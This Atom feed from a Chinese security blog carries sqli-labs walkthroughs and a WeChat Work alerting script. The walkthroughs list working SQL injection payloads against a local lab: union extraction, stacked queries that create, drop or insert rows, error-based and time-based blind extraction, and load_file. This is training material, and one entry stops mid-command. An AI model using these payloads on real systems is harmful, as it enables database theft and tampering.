<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>折戟</title>
  <icon>https://www.gravatar.com/avatar/8ef68a22378880474ce46579bc9fdf1a</icon>
  <subtitle>安全爱好者</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://rliyuqing.github.io/"/>
  <updated>2019-04-16T15:49:01.153Z</updated>
  <id>http://rliyuqing.github.io/</id>
  
  <author>
    <name>折戟</name>
    <email>raosong3374@gmail.com</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Sqli-lab实验Task3（less39-53）</title>
    <link href="http://rliyuqing.github.io/2019/04/15/8.%20Sqli-lab%E5%AE%9E%E9%AA%8CTask3%EF%BC%88less39-53%EF%BC%89/"/>
    <id>http://rliyuqing.github.io/2019/04/15/8. Sqli-lab实验Task3（less39-53）/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-04-16T15:49:01.153Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Sqli-labs实验Task3（less39-53）"><a href="#Sqli-labs实验Task3（less39-53）" class="headerlink" title="Sqli-labs实验Task3（less39-53）"></a>Sqli-labs实验Task3（less39-53）</h1><h2 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h2><p>这个没有闭合的，所以直接使用联合查询：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-39/?id=0 union select 1,user(),database() -- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p><h2 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h2><p>不同的闭合，多尝试几次。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-40/?id=0<span class="string">') union select 1,user(),database() -- #</span></span><br></pre></td></tr></table></figure></p><h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2><p>和39一样：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-41/?id=0 union select 1,user(),database() -- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p><p>但是page-3里的肯定不会这么简单，看了看page-3的标题，这是叠加注入，那就得在搞点其他的测试了，就用less-41来试一试：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-41/?id=1;create table <span class="built_in">test</span> like users;-- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p><p>创建一个和users结构一样的表test。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-6d269fb93c781bd8.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.PNG"><br>同理我们可以对表数据进行更新，比如更改用户密码，删除数据库，或者利用load_file函数上传文件，比如php文件。。。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-41/?id=1;select load_file(<span class="string">'c:/tmpupbbn.php'</span>);</span><br></pre></td></tr></table></figure></p><h2 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h2><p>这里显示的是登陆框，结合这里的叠加注入，我们继续尝试新姿势。<br>登录框用户名随便填，密码填：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ a<span class="string">';create table test2 like users; --</span></span><br></pre></td></tr></table></figure></p><p>创建一个test2的表。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-af32e5f42bee7f97.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.PNG"><br>同理，我们可以删除这个表，和之前的操作一样，我们用户名随便填，叠加注入写入相应的语句就行：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ a<span class="string">';drop table test2 ; --</span></span><br></pre></td></tr></table></figure></p><p>其他的可以继续尝试。不同的数据库会有不同的语句，有兴趣的可以多学习。</p><h2 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h2><p>这个和上一个差不多，不过post传参的闭合方式为单引号加括号，相应的语句稍微改一改就行。</p><h2 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h2><p>这里和42其实相差不多，只不多这里没有了报错，但是注入语句还是一样的，我们写几个新语句大家看看。<br>插入数据：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ a’; insert into users(id,username,password) values (<span class="string">'233'</span>,<span class="string">'233'</span>,<span class="string">'233'</span>); --</span><br></pre></td></tr></table></figure></p><h2 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h2><p>这个也一样，和43的闭合时一样的，单引号加括号，只不过这里是没有报错，会提示说你是一个傻hacker。。。但是我们自己可以去查看数据库发现自己的语句是被执行了的。</p><h2 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h2><p>我们可以看到46的标题变了，现在我们要进行的就是order by的注入测试了，具体什么意思的。就是我们之前的sql语句最后都是limit 0,1。现在是：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ select * from users order by id;</span><br></pre></td></tr></table></figure></p><p>这时候我们就不能用之前的进行访问了：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-46/?sort=1</span><br></pre></td></tr></table></figure></p><p>这个传参就是sort传的就是order by的值，sort=1表示按id排序，看一下：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-036d06241df614ce.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.PNG"><br>这就是我们访问上面的url看到的页面，这时候我们就可以考虑考虑如何构造order by的注入语句。Order by后面可以接上面语句呢。<br>我们可以尝试使用mysql的updatexml的函数来达到注入获取敏感信息的目的：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-46/?sort=1 and(updatexml(1,concat(0x7e,(select user())),0))</span><br></pre></td></tr></table></figure></p><p><img src="https://upload-images.jianshu.io/upload_images/6269327-fd5d4a22971257c2.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.PNG"><br>同样我们可以更改updatexml()函数里的第二个参数里的sql语句，来获取我们想要的信息。比如：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-46/?sort=5 and(updatexml(1,concat(0x7e,(select email_id from emails <span class="built_in">limit</span> 0,1)),0))</span><br></pre></td></tr></table></figure></p><h2 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h2><p>这个一下就猜到加了闭合。。。不要问我为什么，套路熟悉了一下就破了：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-47/?sort=1<span class="string">' and(updatexml(1,concat(0x7e,(select email_id from emails limit 0,1)),0)) -- #</span></span><br></pre></td></tr></table></figure></p><h2 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h2><p>这个没有报错了，这时候我们就不能用XPATH报错来获取信息了。不过可以使用盲注。<br>可以利用sort=rand(true/false)进行判断。写一下我们的注入语句：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-48/?sort=rand(ascii(left(database(),1))=115)</span><br></pre></td></tr></table></figure></p><p>这是正确的情况：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-feae911e0856f8ac.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.PNG"><br>这是错误的情况：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-1bc40b2bafe10e3f.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.PNG"><br>我们可以根据正确错误的不同返回值来获取信息。<br>更多关于updatexml的注入可查看：<br><a href="http://www.freebuf.com/column/145988.html" target="_blank" rel="noopener">www.freebuf.com/column/145988.html</a></p><h2 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h2><p>这一个无论我们输入什么得出的都是一样的，这个时候我们就不能用上面的方法了，不过可以用基于时间的盲注（单引号闭合）：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-49/?sort=1<span class="string">' and (If(ascii(substr((select username from users where id=1),1,1))=69,0,sleep(5)))-- #</span></span><br></pre></td></tr></table></figure></p><h2 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h2><p>从这里开始我们就开始新的，order by和叠加注入的挑战<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-50/?sort=1; insert into users values(1000,”root1”,”root1”)</span><br></pre></td></tr></table></figure></p><h2 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h2><p>不用猜就知道加了闭合：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-51/?sort=1<span class="string">';create table test51 like users; --</span></span><br></pre></td></tr></table></figure></p><p><img src="https://upload-images.jianshu.io/upload_images/6269327-82fd56e77b75ceb0.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.PNG"></p><h2 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h2><p>这个50一样，只是没有报错，payload也一样。</p><h2 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h2><p>这个和51一样，但是没有报错：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-53/?sort=1<span class="string">';create table test53 like users; --</span></span><br></pre></td></tr></table></figure></p><p>快结束了，还有最后page 4，也会在近期写完的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Sqli-labs实验Task3（less39-53）&quot;&gt;&lt;a href=&quot;#Sqli-labs实验Task3（less39-53）&quot; class=&quot;headerlink&quot; title=&quot;Sqli-labs实验Task3（less39-53）&quot;&gt;&lt;/a&gt;Sqli-
      
    
    </summary>
    
      <category term="攻防实验" scheme="http://rliyuqing.github.io/categories/%E6%94%BB%E9%98%B2%E5%AE%9E%E9%AA%8C/"/>
    
    
      <category term="sqli-labs" scheme="http://rliyuqing.github.io/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>企业微信告警和回调</title>
    <link href="http://rliyuqing.github.io/2019/04/15/27.%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E5%91%8A%E8%AD%A6%E4%BB%A5%E5%8F%8A%E5%9B%9E%E8%B0%83/"/>
    <id>http://rliyuqing.github.io/2019/04/15/27.企业微信告警以及回调/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-06-11T19:30:53.724Z</updated>
    
    <content type="html"><![CDATA[<hr><h1 id="企业微信告警和回调"><a href="#企业微信告警和回调" class="headerlink" title="企业微信告警和回调"></a>企业微信告警和回调</h1><hr><p>最近正在参与一次护网行动，学到很多东西，等这次结束再来好好谈谈收获和总结吧，这都是后话了。这次主要分享一下企业微信的告警以及回调的实现以及踩的坑。<br>先说说前因后果吧，在护网行动正式开打之前，我们对xx公司也进行详细的网络情况了解，以及合作梳理。具体之后再说，反正结论就是网络边界的梳理和整顿都已经弄得比较不错了，唯一存在问题的就是在一些waf以及ids的告警上，因为策略全部default开启，导致出现大量的告警情况，为对攻击的分析以及响应带来很多麻烦，因此我们一部分工作在整理和梳理网络告警的方面。<br>他们一共有三个网络告警的设备，防火墙，ids，F5等，都是通过同一个zabbix发送请求到告警平台进行告警。于是我们在阿里云上建立了一个soc(安全运营中心)，上面搭了elk，zabbix将三个网络告警全部发送到这个elk上……..之后再说。最后将soc上整理之后的告警发送到企业微信，并达到通过在企业微信上回复消息，对ip进行增删黑名单的操作。<br>企业微信回调过程：</p><ol><li>创建企业微信应用：登录企业微信-&gt;应用与小程序-&gt;自建-&gt;创建应用</li><li>创建了之后<br><img src="https://upload-images.jianshu.io/upload_images/6269327-da186556fe2ffd5b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="111"><br>设置api接收进行。设置api接收时需要进行回调验证，部署好后面那个回调代码就行。<br>发送告警很简单。根据企业微信给的api文档说明以及示例代码可以写出来。我这里用的是python3：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2019/6/2</span></span><br><span class="line"><span class="comment"># @Author  : XDN01</span></span><br><span class="line"><span class="comment"># @Site    : www.raosong.cc</span></span><br><span class="line"><span class="comment"># @File    : sent_wexin.py</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line">from flask import Flask,request</span><br><span class="line">import json</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">@app.route(<span class="string">'/getmsg'</span>,methods=[<span class="string">'POST'</span>])</span><br><span class="line">def index():</span><br><span class="line">    corpid = <span class="string">"xxxxxxxxxxx"</span></span><br><span class="line">    secret = <span class="string">"xxxxxxxxxxxxxxxx"</span></span><br><span class="line">    agentid = <span class="string">"xxxxxxxxx"</span></span><br><span class="line">    <span class="comment">#if request.method == 'GET':</span></span><br><span class="line">     <span class="comment">#   return 'Deny'</span></span><br><span class="line">     <span class="comment">#接收POST的数据</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> request.form.get(<span class="string">'checkid'</span>) == <span class="string">'checkid'</span>:  <span class="comment"># 校验的id，避免有人恶意发送</span></span><br><span class="line">            GetMsg = request.form.get(<span class="string">'msg'</span>)</span><br><span class="line">            <span class="built_in">print</span>(GetMsg)</span><br><span class="line">            wechat = WeChat(corpid, secret, agentid)</span><br><span class="line">            <span class="keyword">if</span> wechat.send_message(GetMsg) == 1:</span><br><span class="line">                <span class="built_in">return</span> <span class="string">'Sent to weixin successed'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">return</span> <span class="string">'Failed'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">return</span> <span class="string">'Deny'</span></span><br><span class="line"></span><br><span class="line">class WeChat(object):</span><br><span class="line">    def __init__(self, corpid, secret, agentid):</span><br><span class="line">        self.url = <span class="string">"https://qyapi.weixin.qq.com"</span></span><br><span class="line">        self.corpid = corpid</span><br><span class="line">        self.secret = secret</span><br><span class="line">        self.agentid = agentid</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取企业微信的 access_token</span></span><br><span class="line">    def access_token(self):</span><br><span class="line">        url_arg = <span class="string">'/cgi-bin/gettoken?corpid=&#123;id&#125;&amp;corpsecret=&#123;crt&#125;'</span>.format(</span><br><span class="line">            id=self.corpid, crt=self.secret)</span><br><span class="line">        url = self.url + url_arg</span><br><span class="line">        response = requests.get(url=url)</span><br><span class="line">        text = response.text</span><br><span class="line">        self.token = json.loads(text)[<span class="string">'access_token'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构建消息格式</span></span><br><span class="line">    def messages(self, msg):</span><br><span class="line">        values = &#123;</span><br><span class="line">            <span class="string">"touser"</span>: <span class="string">'@all'</span>,</span><br><span class="line">            <span class="comment"># "toparty" : "PartyID1|PartyID2",   # 向这些部门发送  #'@all'给所有的发</span></span><br><span class="line">            <span class="string">"msgtype"</span>: <span class="string">'text'</span>,</span><br><span class="line">            <span class="string">"agentid"</span>: self.agentid,</span><br><span class="line">            <span class="string">"text"</span>: &#123;<span class="string">'content'</span>: msg&#125;,</span><br><span class="line">            <span class="string">"safe"</span>: 0</span><br><span class="line">        &#125;</span><br><span class="line">        self.msg = (bytes(json.dumps(values), <span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送信息</span></span><br><span class="line">    def send_message(self, msg):</span><br><span class="line">        self.access_token()</span><br><span class="line">        self.messages(msg)</span><br><span class="line">        send_url = <span class="string">'&#123;url&#125;/cgi-bin/message/send?access_token=&#123;token&#125;'</span>.format(url=self.url, token=self.token)</span><br><span class="line">        response = requests.post(url=send_url, data=self.msg)</span><br><span class="line">        errcode = json.loads(response.text)[<span class="string">'errcode'</span>]</span><br><span class="line">        <span class="keyword">if</span> errcode == 0:</span><br><span class="line">            <span class="built_in">return</span> 1</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">return</span> 0</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=8000,debug=True)</span><br></pre></td></tr></table></figure></li></ol><p>下面是用户将数据发送给企业微信上的应用，回调发送到soc上进行记录，这里是记录在文件中：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line">from flask import Flask,request</span><br><span class="line">from WXBizMsgCrypt import WXBizMsgCrypt</span><br><span class="line">import xml.etree.cElementTree as ET</span><br><span class="line">import sys</span><br><span class="line">from RedisUtil import RedisUtil</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">@app.route(<span class="string">'/weixin'</span>, methods=[<span class="string">'GET'</span>,<span class="string">'POST'</span>])</span><br><span class="line">def index():</span><br><span class="line">    sToken = <span class="string">'xxxxxxxx'</span></span><br><span class="line">    sEncodingAESKey = <span class="string">'xxxxxxxxxxxxxxxxx'</span></span><br><span class="line">    sCorpID = <span class="string">'xxxxxxxxxxxx'</span></span><br><span class="line">    wxcpt=WXBizMsgCrypt(sToken,sEncodingAESKey,sCorpID)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#获取url验证时微信发送的相关参数</span></span><br><span class="line">    sVerifyMsgSig=request.args.get(<span class="string">'msg_signature'</span>)</span><br><span class="line">    sVerifyTimeStamp=request.args.get(<span class="string">'timestamp'</span>)</span><br><span class="line">    sVerifyNonce=request.args.get(<span class="string">'nonce'</span>)</span><br><span class="line">    sVerifyEchoStr=request.args.get(<span class="string">'echostr'</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    sReqMsgSig = sVerifyMsgSig</span><br><span class="line">    sReqTimeStamp = sVerifyTimeStamp</span><br><span class="line">    sReqNonce = sVerifyNonce</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    sResqMsgSig = sVerifyMsgSig</span><br><span class="line">    sResqTimeStamp = sVerifyTimeStamp</span><br><span class="line">    sResqNonce = sVerifyNonce</span><br><span class="line">    <span class="comment">#验证url</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        ret,sEchoStr=wxcpt.VerifyURL(sVerifyMsgSig, sVerifyTimeStamp,sVerifyNonce,sVerifyEchoStr)</span><br><span class="line">        <span class="keyword">if</span> (ret != 0 ):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"ERR: VerifyURL ret:"</span>,ret)</span><br><span class="line">            sys.exit(1)</span><br><span class="line">        <span class="built_in">return</span> sEchoStr</span><br><span class="line"></span><br><span class="line">    <span class="comment">#接收客户端消息</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        sReqMsgSig = sVerifyMsgSig</span><br><span class="line">        sReqTimeStamp = sVerifyTimeStamp</span><br><span class="line">        sReqNonce = sVerifyNonce</span><br><span class="line">        sReqData = request.data</span><br><span class="line"></span><br><span class="line">        ret,sMsg=wxcpt.DecryptMsg( sReqData, sReqMsgSig, sReqTimeStamp, sReqNonce)</span><br><span class="line">        <span class="keyword">if</span> (ret != 0):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"ERR: VerifyURL ret:"</span>)</span><br><span class="line">            sys.exit(1)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#解析发送的内容</span></span><br><span class="line">        xml_tree = ET.fromstring(sMsg)</span><br><span class="line">        content = xml_tree.find(<span class="string">"Content"</span>).text</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(content)</span><br><span class="line">        <span class="comment">#将接收到的内容记录在文件当中</span></span><br><span class="line">        f1 = open(<span class="string">'weixin_soc_get.txt'</span>, <span class="string">'a'</span>)</span><br><span class="line">        f1.writelines(content+<span class="string">"\n"</span>)</span><br><span class="line">        f1.close()</span><br><span class="line">        <span class="built_in">return</span> <span class="string">"OK"</span> <span class="comment"># 默认发送三次 ，接收到ok之后就不会重复发送</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=9999,debug=True)</span><br></pre></td></tr></table></figure></p><p>直接更改代码中的token和企业id什么的就能直接用，具体的可以参考官方文档<a href="https://work.weixin.qq.com/api/doc" target="_blank" rel="noopener">https://work.weixin.qq.com/api/doc</a><br>以及官方github库<a href="https://github.com/sbzhu/weworkapi_python" target="_blank" rel="noopener">https://github.com/sbzhu/weworkapi_python</a><br>带上官方这里给的是python2的，而且给的代码库还会有一些问题，主要就是WXBizMsgCrypt.py这个文件，具体的我已经进行更改，在我的github项目中，可以直接替换就行：<a href="https://github.com/rliyuqing/weworkapi_py3" target="_blank" rel="noopener">https://github.com/rliyuqing/weworkapi_py3</a><br>回调和发送信息创建的webserver用nginx代理就行，十分方便:<br><img src="https://upload-images.jianshu.io/upload_images/6269327-86b09a2184875ac7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="nginx代理"><br>统一端口开放很重要的。其他的内容下次在分享，主要刚刚把企业微信告警的来回的两条线走通，所以记录分享一下。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h1 id=&quot;企业微信告警和回调&quot;&gt;&lt;a href=&quot;#企业微信告警和回调&quot; class=&quot;headerlink&quot; title=&quot;企业微信告警和回调&quot;&gt;&lt;/a&gt;企业微信告警和回调&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;最近正在参与一次护网行动，学到很多东西，等这次结束再来好好谈谈收
      
    
    </summary>
    
      <category term="小脚本" scheme="http://rliyuqing.github.io/categories/%E5%B0%8F%E8%84%9A%E6%9C%AC/"/>
    
    
      <category term="小脚本" scheme="http://rliyuqing.github.io/tags/%E5%B0%8F%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>Sqli-lab实验Task1（less1-22）</title>
    <link href="http://rliyuqing.github.io/2019/04/15/6.%20Sqli-lab%E5%AE%9E%E9%AA%8CTask1%EF%BC%88less1-22%EF%BC%89/"/>
    <id>http://rliyuqing.github.io/2019/04/15/6. Sqli-lab实验Task1（less1-22）/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-04-16T15:48:46.545Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Sqli-lab实验Task1（less1-22）"><a href="#Sqli-lab实验Task1（less1-22）" class="headerlink" title="Sqli-lab实验Task1（less1-22）"></a>Sqli-lab实验Task1（less1-22）</h1><h2 id="源码下载"><a href="#源码下载" class="headerlink" title="源码下载"></a>源码下载</h2><p>直接贴上github地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ol><li>直接下载一个phpstudy，当然使用其他的一键环境搭建也行，我比较推荐phpstudy。</li><li>把下载好的sqli-lab文件放入对应的www即网站根目录下就可，最后修改sql-connections/db-creds.inc文件当中的mysql账号密码。</li><li>开启phpstudy，将user和pass修改你的mysql 的账号和密码，访问127.0.0.1的页面，点击<br>setup/reset database for lab进行安装数据库的创建，至此，安装结束。我们就可以开始了。<h2 id="攻关开始"><a href="#攻关开始" class="headerlink" title="攻关开始"></a>攻关开始</h2><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3>判断是否存在注入：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-1/?id=1](http://127.0.0.1/sqli-labs-master/Less-1/?id=1)<span class="string">'</span></span><br></pre></td></tr></table></figure></li></ol><p>即加一个单引号闭合一下变量试一试。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-d8a91147d93aa12d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>可以看到报错了，我们可以猜测在id传参过程中使用的就是id={’$id’}这种方法。然后进行注入。<br>猜测字段数：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-1/?id=1<span class="string">'  order by 3 -- #</span></span><br></pre></td></tr></table></figure></p><p>后面的– #是两个注释，mysql中有– （注意两杠后面有一个空格）和#两种注释方法，我的习惯是两种都加，防止有过滤。也可以不使用过滤，但是需将最后还存在的一个单引号进行闭合防止出错。<br>获取数据库名，数据库用户等信息：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-1/?id=-1<span class="string">'  union select 1,database(),user()  -- #</span></span><br></pre></td></tr></table></figure></p><p><img src="http://upload-images.jianshu.io/upload_images/6269327-414bee12e965de6b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>可以看到已经获取到了敏感的信息了，注意此时因为前面报错可以看到有limit 0,1我们可以知道此处如果需要输出我们union查询出的信息要将前面的位占了，即使前面的输出为不存在。可以看到我是将id的值写为负值，然后将输出的位置就让给了后面我们需要输出的信息，这个技巧在有输出限制的时候十分重要。<br>然后还有一点，我们上面猜测出了字段数为3，但这里输出的只有2个，所以我们union查询要保证字段数一样，不足的补数字，或者null。然后第一个是没有输出的，所以我将需要输出的写在了后面两个。<br>接下来的一些注入就很简单了，利用mysql自带的information_schema便可以得到很多我们需要的数据了，进行脱裤。这里可以利用information_schema这个库的原因是我们是root权限，如果不是root权限，只对指定数据库存在一定的权限，这时我们就要结合盲注进行测试了。盲注的话则需要利用工具来辅助，如sqlmap等。</p><h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><p>判断是否存在注入：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-2/?id=1](http://127.0.0.1/sqli-labs-master/Less-2/?id=1)<span class="string">'</span></span><br></pre></td></tr></table></figure></p><p>看看这一次的报错和上一次的有什么不一样<br><img src="http://upload-images.jianshu.io/upload_images/6269327-732f7941ea107393.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>这次的报错是：’’ LIMIT 0,1 ‘<br>可以看到这里第一个和最后一个单引号是语句里面的，中间一个使我们写入的，而且刚好是成对的，所以猜测这里的id是没有符号扩起来的。语句可能为id={$id}，所以我们之间在后面写入语句。<br>猜测字段数：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-2/?id=1 order by 3</span><br></pre></td></tr></table></figure></p><p>获取数据库名，数据库用户等信息：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-2/?id=-1 union select 1,database(),user() -- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p><p>这个较为简单，比上一个还为简单。结合上面一个的来分析看看，一般传参id为int型都是没有符号闭合。</p><h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><p>判断是否存在注入：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-3/?id=1<span class="string">'</span></span><br></pre></td></tr></table></figure></p><p>查看报错：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-d1d60e829c26fd97.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>分析报错情况，这里是有一个括号5个单引号，其中一个是我们写入的，所以闭合应该是利用单引号和括号进行闭合的。继续进行测试。<br>猜测字段数：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-3/?id=1<span class="string">') order by 3 -- #</span></span><br></pre></td></tr></table></figure></p><p>获取数据库名，数据库用户等信息：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-3/?id=-1<span class="string">') union select 1,database(),user() -- #</span></span><br></pre></td></tr></table></figure></p><p>后面的可以继续尝试注入。</p><h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><p>判断是否存在注入：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-4/?id=1<span class="string">'</span></span><br></pre></td></tr></table></figure></p><p>我的天，这次竟然没有报错！没事换一个：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-4/?id=1”</span><br></pre></td></tr></table></figure></p><p>这次报错了：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-42a6461cb1b0f97a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>报错是：’”1””) LIMIT 0,1’<br>分析可知这个的传参是被括号和双引号闭合的。继续：<br>猜测字段数：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  http://127.0.0.1/sqli-labs-master/Less-4/?id=1<span class="string">")  order by 3 -- #</span></span><br></pre></td></tr></table></figure></p><p>获取数据库名，数据库用户等信息：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  